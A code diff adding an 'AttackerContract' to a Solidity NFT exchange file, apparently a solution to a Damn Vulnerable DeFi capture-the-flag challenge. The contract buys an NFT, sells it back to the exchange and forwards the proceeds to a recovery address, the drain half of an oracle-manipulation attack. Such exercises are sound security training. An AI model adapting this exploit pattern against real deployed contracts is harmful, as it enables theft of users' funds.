@@ -6,6 +6,7 @@ import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import {TrustfulOracle} from "./TrustfulOracle.sol";
 import {DamnValuableNFT} from "../DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract Exchange is ReentrancyGuard {
     using Address for address payable;
@@ -71,3 +72,44 @@ contract Exchange is ReentrancyGuard {
 
     receive() external payable {}
 }
+
+contract AttackerContract is IERC721Receiver {
+    TrustfulOracle public oracle;
+    Exchange public exchange;
+    DamnValuableNFT public token;
+    address public recovery;
+
+    uint256 public nftId;
+
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _token, address _recovery) {
+        oracle = _oracle;
+        exchange = _exchange;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function buyNFT() external payable {
+        nftId = exchange.buyOne{value: 0.1 ether}();
+    }
+
+    function sellNFT() external {
+        token.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function sendToRecovery(uint256 amount) external {
+        payable(recovery).transfer(amount);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
